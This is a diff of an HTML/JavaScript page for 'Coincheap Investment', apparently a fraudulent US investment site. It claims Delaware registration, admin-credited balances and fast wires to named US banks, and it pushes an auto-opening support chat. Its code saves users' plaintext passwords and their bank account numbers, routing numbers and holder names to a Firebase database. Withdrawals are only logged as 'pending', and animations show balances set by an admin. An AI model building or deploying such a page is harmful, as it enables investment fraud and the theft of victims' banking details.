@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Coincheap Investment | Private Vault - USA</title>
+<title>Coincheap Investment | USA</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
 <style>
@@ -10,58 +10,130 @@
 h1,h2{font-family:'Playfair Display',serif}
 .card{background:linear-gradient(145deg,#121A2F,#0F172A);border:1px solid rgba(212,175,55,0.15);padding:24px;border-radius:22px;margin:12px}
 .card-gold{border:1px solid rgba(212,175,55,0.3)}
-input,select,textarea{width:100%;padding:14px;margin:8px 0;border:1px solid rgba(255,255,255,.1);border-radius:12px;background:#080C18;color:#fff;outline:none}
-.btn{padding:15px;background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;border:none;border-radius:12px;font-weight:700;width:100%;margin-top:12px;cursor:pointer;text-transform:uppercase}
+input,select{width:100%;padding:14px;margin:8px 0;border:1px solid rgba(255,255,255,.1);border-radius:12px;background:#080C18;color:#fff;outline:none}
+.btn{padding:15px;background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;border:none;border-radius:12px;font-weight:700;width:100%;margin-top:12px;cursor:pointer;text-transform:uppercase;letter-spacing:0.5px}
 .btnDark{background:#1E293B;color:#E8EAF0;border:1px solid rgba(255,255,255,.1)}
 .tab{display:none}.tab.active{display:block}
 .nav{display:flex;gap:6px;padding:12px;background:#080C18;border-bottom:1px solid rgba(212,175,55,.15);position:sticky;top:0;z-index:99}
-.nav button{padding:11px;border-radius:10px;background:#121A2F;color:#8B95B0;flex:1;border:1px solid rgba(255,255,255,.06);font-size:12px;text-transform:uppercase}
+.nav button{padding:11px;border-radius:10px;background:#121A2F;color:#8B95B0;flex:1;border:1px solid rgba(255,255,255,.06);font-size:12px}
 .nav button.active{background:#D4AF37;color:#080C18;font-weight:700}
 .hero{background:radial-gradient(at top,#1A2340,#080C18);padding:50px 20px;text-align:center}
 .balCard{background:linear-gradient(135deg,#121A2F,#1A2340);border:1px solid rgba(212,175,55,.25);padding:26px;border-radius:24px;margin:12px;position:relative;overflow:hidden}
-.bankItem{background:rgba(8,12,24,.6);border:1px solid rgba(255,255,255,.06);padding:14px;border-radius:14px;margin:10px 0;display:flex;justify-content:space-between}
+.bankItem{background:rgba(8,12,24,.6);border:1px solid rgba(255,255,255,.06);padding:14px;border-radius:14px;margin:10px 0;display:flex;justify-content:space-between;align-items:center}
 .goldText{background:linear-gradient(90deg,#D4AF37,#F5E6A3);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .divider{height:1px;background:linear-gradient(90deg,transparent,rgba(212,175,55,.2),transparent);margin:16px 0}
 @keyframes goldPulse{0%{box-shadow:0 0 0 0 rgba(212,175,55,.4)}50%{box-shadow:0 0 0 18px rgba(212,175,55,0),0 0 50px rgba(212,175,55,.3);transform:scale(1.02)}100%{box-shadow:0 0 0 0 rgba(212,175,55,0);transform:scale(1)}}.credit-animate{animation:goldPulse 1.2s ease-out 2}
 .confetti{position:absolute;width:5px;height:5px;background:#D4AF37;animation:fall 1.2s ease-out forwards}@keyframes fall{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(110px) rotate(720deg);opacity:0}}
-.toast{position:fixed;top:70px;left:50%;transform:translateX(-50%);background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;padding:10px 18px;border-radius:30px;font-weight:700;font-size:12px;z-index:10000;box-shadow:0 10px 30px rgba(212,175,55,.35)}
+.toast{position:fixed;top:70px;left:50%;transform:translateX(-50%);background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;padding:10px 18px;border-radius:30px;font-weight:700;font-size:12px;z-index:10000}
 </style>
 </head>
 <body>
-<div style="padding:16px 18px;display:flex;justify-content:space-between;border-bottom:1px solid rgba(212,175,55,.12)"><div style="font-family:'Playfair Display';font-size:18px">COINCHEAP <span class="goldText">INVESTMENT</span></div><div id="topEmail" style="font-size:11px;color:#D4AF37"></div></div>
-<div class="nav"><button id="b1" class="active" onclick="showTab('home')">Private</button><button id="b2" onclick="showTab('register')">Join</button><button id="b3" onclick="showTab('login')">Access</button><button id="b4" onclick="showTab('dashboard')">Vault</button></div>
 
+<div style="padding:16px 18px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(212,175,55,.12)">
+<div style="font-family:'Playfair Display';font-size:18px;letter-spacing:1px">COINCHEAP <span class="goldText">INVESTMENT</span></div>
+<div id="topEmail" style="font-size:11px;color:#D4AF37;font-weight:600"></div>
+</div>
+
+<div class="nav">
+<button id="b1" class="active" onclick="showTab('home')">Home</button>
+<button id="b2" onclick="showTab('register')">Create Account</button>
+<button id="b3" onclick="showTab('login')">Login</button>
+<button id="b4" onclick="showTab('dashboard')">Dashboard</button>
+</div>
+
+<!-- HOME -->
 <div id="home" class="tab active">
-<div class="hero"><p style="letter-spacing:3px;font-size:10px;color:#D4AF37">EST. 2019 • DELAWARE, USA</p><h1 style="font-size:34px;margin-top:10px">Private Wealth<br><span class="goldText">Management</span></h1><p style="color:#8B95B0;margin-top:14px;font-size:14px;line-height:1.7">USA private vault. Admin-credited. Direct to Huntington, GLCU, Abri, Navy Federal, Alliant, Chase, BoA.</p><button class="btn" style="max-width:280px;margin:24px auto 0;display:block" onclick="showTab('register')">Request Access →</button></div>
-<div class="card card-gold"><h2>Why Matured Investors Choose Us</h2><div class="divider"></div><p style="color:#C2C9D6;font-size:13px;line-height:1.8">Delaware-registered boutique. Balance credited by treasury team. Withdrawals 2-12h to verified USA banks. Midnight + Champagne Gold design for serious wealth.</p></div>
-<div class="card"><h3 style="font-family:'Playfair Display'">Live Support • USA</h3><p style="color:#8B95B0;font-size:12px;margin-top:6px">Click the gold chat bubble bottom-right → Chat with treasury</p></div>
+<div class="hero">
+<p style="letter-spacing:3px;font-size:10px;color:#D4AF37">EST. 2019 • DELAWARE, USA</p>
+<h1 style="font-size:34px;margin-top:12px;line-height:1.1">Private Investment<br><span class="goldText">Platform</span></h1>
+<p style="color:#8B95B0;margin-top:16px;font-size:14px;line-height:1.7;max-width:500px;margin-left:auto;margin-right:auto">USA registered investment platform. Balance added by admin. Withdraw directly to your USA bank account — Huntington, GLCU, Abri, Navy Federal, Alliant, Chase, Bank of America.</p>
+<button class="btn" style="max-width:300px;margin:28px auto 0;display:block" onclick="showTab('register')">Create Account →</button>
+<p style="color:#5A657E;font-size:11px;margin-top:12px">Live chat support at bottom-right • Instant pop-up</p>
+</div>
+<div class="card card-gold">
+<h2>Why People Choose Us</h2><div class="divider"></div>
+<p style="color:#C2C9D6;font-size:13.5px;line-height:1.8">Delaware-registered company. Your balance is added by our admin team after investment. You can withdraw within 2-12 hours to your verified USA bank. Questions? Use the live chat that pops up instantly.</p>
+<div class="divider"></div>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;text-align:center;margin-top:14px">
+<div><div style="color:#D4AF37;font-weight:700">2-12H</div><div style="font-size:11px;color:#8B95B0">Withdraw Time</div></div>
+<div><div style="color:#D4AF37;font-weight:700">USA Banks</div><div style="font-size:11px;color:#8B95B0">Direct Wire</div></div>
+</div>
+</div>
 </div>
 
-<div id="register" class="tab"><div class="card card-gold" style="max-width:420px;margin:30px auto"><h2 style="text-align:center">Join The Vault</h2><div class="divider"></div><input id="rEmail" placeholder="Private Email"><input id="rPass" type="password" placeholder="Vault Passcode"><input id="rCountry" value="USA"><button class="btn" onclick="signup()">Submit Application</button><p id="rMsg" style="text-align:center;color:#D4AF37;margin-top:10px;font-weight:600"></p></div></div>
+<!-- REGISTER -->
+<div id="register" class="tab">
+<div class="card card-gold" style="max-width:420px;margin:30px auto">
+<h2 style="text-align:center">Create Account</h2><div class="divider"></div>
+<input id="rEmail" placeholder="Email Address">
+<input id="rPass" type="password" placeholder="Password">
+<input id="rCountry" value="USA">
+<button class="btn" onclick="signup()">Create Account</button>
+<p id="rMsg" style="text-align:center;color:#D4AF37;margin-top:12px;font-weight:600;font-size:13px"></p>
+<p style="text-align:center;color:#5A657E;font-size:11px;margin-top:10px">Already have account? <span style="color:#D4AF37;cursor:pointer" onclick="showTab('login')">Login</span></p>
+</div>
+</div>
 
-<div id="login" class="tab"><div class="card" style="max-width:420px;margin:30px auto"><h2 style="text-align:center">Vault Access</h2><div class="divider"></div><input id="lEmail" placeholder="Vault Email"><input id="lPass" type="password" placeholder="Passcode"><button class="btn" onclick="login()">Access Vault</button><p id="lMsg" style="text-align:center;color:#D4AF37;margin-top:10px;font-weight:600"></p></div></div>
+<!-- LOGIN -->
+<div id="login" class="tab">
+<div class="card" style="max-width:420px;margin:30px auto">
+<h2 style="text-align:center">Login</h2><div class="divider"></div>
+<input id="lEmail" placeholder="Email">
+<input id="lPass" type="password" placeholder="Password">
+<button class="btn" onclick="login()">Login</button>
+<p id="lMsg" style="text-align:center;color:#D4AF37;margin-top:12px;font-weight:600;font-size:13px"></p>
+</div>
+</div>
 
+<!-- DASHBOARD -->
 <div id="dashboard" class="tab">
-<div class="balCard" id="balCard"><div id="confettiBox" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none"></div><p id="dashEmail" style="color:#D4AF37;font-size:11px;font-weight:600"></p><p style="color:#8B95B0;font-size:10px;letter-spacing:1px;margin-top:6px">VAULT BALANCE • ADMIN CREDITED</p><h1 style="margin-top:10px;font-size:38px;font-family:'Playfair Display'">$<span id="bal">0</span>.00</h1><div style="display:flex;gap:8px;margin-top:14px"><span style="font-size:10px;padding:5px 10px;border-radius:20px;background:rgba(212,175,55,.12);border:1px solid rgba(212,175,55,.25);color:#D4AF37">● LIVE VAULT</span><span id="creditBadge" style="font-size:10px;padding:5px 10px;border-radius:20px;background:rgba(255,255,255,.05);color:#8B95B0">INSURED</span></div></div>
-<div class="card"><h3>Linked USA Banks</h3><div id="myBanks" style="margin-top:10px;color:#8B95B0">No bank yet</div><button class="btn btnDark" onclick="openBank()">+ Link USA Bank</button></div>
-<div class="card card-gold"><h3>Request Settlement</h3><input id="wAmount" type="number" placeholder="Amount e.g 1500"><button class="btn" onclick="requestWithdraw()">Initiate Wire →</button><p id="wMsg" style="color:#D4AF37;font-weight:600;margin-top:8px;font-size:12px"></p></div>
-<div style="text-align:center"><button class="btn btnDark" style="max-width:180px" onclick="logout()">Sign Out</button></div>
+<div class="balCard" id="balCard">
+<div id="confettiBox" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1"></div>
+<div style="position:relative;z-index:2">
+<p id="dashEmail" style="color:#D4AF37;font-size:11px;font-weight:700;letter-spacing:0.5px"></p>
+<p style="color:#8B95B0;font-size:10px;letter-spacing:1.5px;margin-top:8px">CURRENT BALANCE</p>
+<h1 style="margin-top:8px;font-size:40px;font-family:'Playfair Display'">$<span id="bal">0</span>.00</h1>
+<p style="color:#5A657E;font-size:11px;margin-top:6px">Balance added by admin</p>
+</div>
 </div>
 
-<div id="bankModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(8,12,24,0.92);z-index:9999;padding:20px"><div style="background:#121A2F;border:1px solid rgba(212,175,55,.2);padding:20px;border-radius:20px;max-width:380px;margin:40px auto"><div style="display:flex;justify-content:space-between"><h3>Link USA Bank</h3><button onclick="document.getElementById('bankModal').style.display='none'" style="background:#ef4444;color:#fff;border:none;padding:5px 10px;border-radius:8px">X</button></div><select id="mBank"><option>Huntington Bank</option><option>GLCU</option><option>Abri Credit Union</option><option>Navy Federal</option><option>Alliant</option><option>Chase</option><option>Bank of America</option></select><input id="mAcc" placeholder="Account Number"><input id="mRouting" placeholder="Routing"><input id="mName" placeholder="Holder Name"><select id="mType"><option>Checking</option><option>Savings</option></select><button class="btn" onclick="saveBank()">Link Bank</button><p id="mMsg" style="color:#D4AF37"></p></div></div>
+<div class="card">
+<h3 style="font-size:14px">My Banks</h3>
+<div id="myBanks" style="margin-top:12px;color:#8B95B0;font-size:13px">No bank added yet</div>
+<button class="btn btnDark" onclick="openBank()">+ Add Bank Account</button>
+</div>
 
-<!-- SUPPORT CHAT BUBBLE -->
-<div id="supportBubble" style="position:fixed;bottom:20px;right:20px;z-index:9999;background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;padding:14px 20px;border-radius:30px;font-weight:800;box-shadow:0 10px 30px rgba(212,175,55,.4);cursor:pointer;display:flex;align-items:center;gap:8px" onclick="toggleSupport()">💬 Support</div>
-<div id="supportChat" style="display:none;position:fixed;bottom:85px;right:18px;width:330px;max-width:92vw;background:#121A2F;border:1px solid rgba(212,175,55,.25);border-radius:20px;z-index:10000;box-shadow:0 20px 60px rgba(0,0,0,.6)">
-<div style="background:linear-gradient(90deg,#1A2340,#121A2F);padding:14px 16px;border-radius:20px 20px 0 0;display:flex;justify-content:space-between"><div><b style="color:#E8EAF0">🇺🇸 Treasury Support</b><p style="font-size:11px;color:#8B95B0">Reply in 2-5 mins</p></div><button onclick="toggleSupport()" style="background:rgba(239,68,68,.2);color:#ef4444;border:1px solid rgba(239,68,68,.3);padding:5px 10px;border-radius:8px">X</button></div>
-<div style="padding:14px"><p style="font-size:12px;color:#C2C9D6">Hi! How can treasury help your USA bank settlement?</p><input id="chatEmail" placeholder="Your email (auto if logged in)" style="margin-top:10px"><textarea id="chatMsg" placeholder="Type your question about withdrawal, balance, banks..." style="min-height:70px"></textarea><button class="btn" style="margin-top:8px" onclick="sendSupport()">Send to Treasury →</button><p id="chatStatus" style="font-size:12px;color:#D4AF37;margin-top:8px;font-weight:600"></p><p style="font-size:9px;color:#5A667F;text-align:center;margin-top:8px">Avg reply 3 mins • support@coincheap-investment.com</p></div>
+<div class="card card-gold">
+<h3 style="font-size:14px">Withdraw Money</h3>
+<p style="font-size:11px;color:#8B95B0;margin-top:4px">Wire to your linked USA bank • 2-12 hours</p>
+<input id="wAmount" type="number" placeholder="Amount e.g 1500" style="margin-top:14px">
+<button class="btn" onclick="requestWithdraw()">Withdraw →</button>
+<p id="wMsg" style="color:#D4AF37;font-weight:600;margin-top:10px;font-size:12px"></p>
+</div>
+
+<div style="text-align:center;padding:20px">
+<button class="btn btnDark" style="max-width:180px" onclick="logout()">Logout</button>
+</div>
+</div>
+
+<!-- BANK MODAL -->
+<div id="bankModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(8,12,24,0.94);z-index:9999;padding:20px">
+<div style="background:#121A2F;border:1px solid rgba(212,175,55,.25);padding:22px;border-radius:20px;max-width:380px;margin:40px auto">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px"><h3 style="font-size:15px">Add Bank</h3><button onclick="document.getElementById('bankModal').style.display='none'" style="background:#ef4444;color:#fff;border:none;padding:6px 12px;border-radius:8px;cursor:pointer">X</button></div>
+<select id="mBank"><option>Huntington Bank</option><option>GLCU</option><option>Abri Credit Union</option><option>Navy Federal</option><option>Alliant Credit Union</option><option>Chase Bank</option><option>Bank of America</option></select>
+<input id="mAcc" placeholder="Account Number">
+<input id="mRouting" placeholder="Routing Number">
+<input id="mName" placeholder="Account Holder Name">
+<select id="mType"><option>Checking</option><option>Savings</option></select>
+<button class="btn" onclick="saveBank()">Save Bank</button>
+<p id="mMsg" style="color:#D4AF37;margin-top:8px;font-size:12px;font-weight:600"></p>
+</div>
 </div>
 
 <script>
 function showTab(t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'));document.getElementById(t).classList.add('active');let m={home:'b1',register:'b2',login:'b3',dashboard:'b4'};if(document.getElementById(m[t]))document.getElementById(m[t]).classList.add('active');if(t=='dashboard')loadDash();}
 function openBank(){document.getElementById('bankModal').style.display='block';}
-function logout(){localStorage.removeItem('current_user');showTab('home');document.getElementById('topEmail').innerText='';}
-function toggleSupport(){let c=document.getElementById('supportChat');c.style.display=c.style.display==='none'?'block':'none';let em=localStorage.getItem('current_user');if(em)document.getElementById('chatEmail').value=em;}
+function logout(){localStorage.removeItem('current_user');document.getElementById('topEmail').innerText='';showTab('home');}
 </script>
 
 <script type="module">
@@ -71,4 +143,33 @@ const firebaseConfig={apiKey:"AIzaSyCLD9yedNA-llM6VU01L9gZ40jv36PlSsw",authDomai
 const app=initializeApp(firebaseConfig);
 const db=getDatabase(app);
 let lastBalance=0;
-function animateCount(from,to){let s=from;let dur=1200;let st=null;function step(ts){if(!st)st=ts;let p=Math
+function animateCount(from,to){let s=from;let dur=1200;let st=null;function step(ts){if(!st)st=ts;let p=Math.min((ts-st)/dur,1);let ease=1-Math.pow(1-p,3);let cur=Math.floor(s+(to-s)*ease);document.getElementById('bal').innerText=cur;if(p<1)requestAnimationFrame(step);}requestAnimationFrame(step);}
+window.signup=async function(){let e=document.getElementById('rEmail').value.trim().toLowerCase();let p=document.getElementById('rPass').value;if(!e||!p){document.getElementById('rMsg').innerText='Fill email & password';return;}document.getElementById('rMsg').innerText='Creating account...';let k=e.replace(/[^a-zA-Z0-9]/g,'_');let snap=await get(ref(db,'users/'+k));if(snap.exists()){document.getElementById('rMsg').innerText='Account exists! Login now';setTimeout(()=>showTab('login'),800);return;}await set(ref(db,'users/'+k),{email:e,password:p,balance:0,created:new Date().toLocaleString()});document.getElementById('rMsg').innerText='Account created! Redirecting...';setTimeout(()=>showTab('login'),1000);}
+window.login=async function(){let e=document.getElementById('lEmail').value.trim().toLowerCase();let p=document.getElementById('lPass').value;document.getElementById('lMsg').innerText='Checking...';let k=e.replace(/[^a-zA-Z0-9]/g,'_');let snap=await get(ref(db,'users/'+k));if(!snap.exists()||snap.val().password!=p){document.getElementById('lMsg').innerText='Wrong email or password';return;}localStorage.setItem('current_user',e);lastBalance=0;document.getElementById('lMsg').innerText='Login successful!';setTimeout(()=>showTab('dashboard'),600);}
+window.loadDash=async function(){let email=localStorage.getItem('current_user');if(!email){showTab('login');return;}document.getElementById('dashEmail').innerText=email.toUpperCase();document.getElementById('topEmail').innerText=email;let k=email.replace(/[^a-zA-Z0-9]/g,'_');let snap=await get(ref(db,'users/'+k));let newBal=snap.exists()?(snap.val().balance||0):0;if(newBal>lastBalance&&lastBalance!==0){let diff=newBal-lastBalance;document.getElementById('balCard').classList.remove('credit-animate');void document.getElementById('balCard').offsetWidth;document.getElementById('balCard').classList.add('credit-animate');let box=document.getElementById('confettiBox');box.innerHTML='';for(let i=0;i<18;i++){let c=document.createElement('div');c.className='confetti';c.style.left=Math.random()*100+'%';c.style.top='5px';c.style.background=['#D4AF37','#F5E6A3','#B8962E'][Math.floor(Math.random()*3)];c.style.width=(4+Math.random()*6)+'px';c.style.height=c.style.width;box.appendChild(c);}let toast=document.createElement('div');toast.className='toast';toast.innerText='✓ Added +$'+diff;document.body.appendChild(toast);setTimeout(()=>toast.remove(),3500);animateCount(lastBalance,newBal);}else{document.getElementById('bal').innerText=newBal;}lastBalance=newBal;let b=await get(ref(db,'banks/'+k));let h='';if(b.exists()){Object.values(b.val()).forEach(v=>{h+=`<div class="bankItem"><div><b style="color:#D4AF37;font-size:13px">${v.bank}</b><br><span style="font-size:11px;color:#C2C9D6">••••${v.acc.slice(-4)} • Routing: ${v.routing}</span></div><div style="font-size:9px;background:rgba(212,175,55,.12);border:1px solid rgba(212,175,55,.25);padding:4px 10px;border-radius:20px;color:#D4AF37">USA</div></div>`});}document.getElementById('myBanks').innerHTML=h||'<span style="color:#5A657E">No bank added yet — add your USA bank to withdraw</span>';}
+window.saveBank=async function(){let email=localStorage.getItem('current_user');if(!email){alert('Login first');return;}let k=email.replace(/[^a-zA-Z0-9]/g,'_');let bank=document.getElementById('mBank').value,acc=document.getElementById('mAcc').value,routing=document.getElementById('mRouting').value,name=document.getElementById('mName').value,type=document.getElementById('mType').value;if(!acc||!routing||!name){document.getElementById('mMsg').innerText='Fill all fields';return;}document.getElementById('mMsg').innerText='Saving...';await push(ref(db,'banks/'+k),{bank,acc,routing,name,type,email,date:new Date().toLocaleString()});document.getElementById('mMsg').innerText='Bank saved!';setTimeout(()=>{document.getElementById('bankModal').style.display='none';loadDash();},700);}
+window.requestWithdraw=async function(){let amt=document.getElementById('wAmount').value;if(!amt){document.getElementById('wMsg').innerText='Enter amount';return;}let email=localStorage.getItem('current_user')||'Guest';document.getElementById('wMsg').innerText='Sending request...';await push(ref(db,'withdrawals'),{email,amount:amt,time:new Date().toLocaleString(),status:'pending'});document.getElementById('wMsg').innerText='✓ Withdraw request $'+amt+' sent • 2-12 hours';}
+</script>
+
+<!-- CHATWAY - INSTANT POP - YOUR REAL ID -->
+<script>
+  window.chatwaySettings = {
+    greeting: "👋 Hi! Welcome to Coincheap Investment. How can we help you today?",
+    themeColor: "#D4AF37",
+    position: "right"
+  };
+  // INSTANT POP - no delay
+  window.addEventListener('load', function(){
+    // try to open immediately
+    const tryOpen = () => { if(window.Chatway){ Chatway('open'); return true; } return false; };
+    tryOpen();
+    // retry 3 times because widget loads async
+    setTimeout(tryOpen, 500);
+    setTimeout(tryOpen, 1200);
+    setTimeout(tryOpen, 2000);
+  });
+</script>
+<script id="chatway" async="true" src="https://cdn.chatway.app/widget.js?id=EDicIiTepGoB"></script>
+
+</body>
+</html>
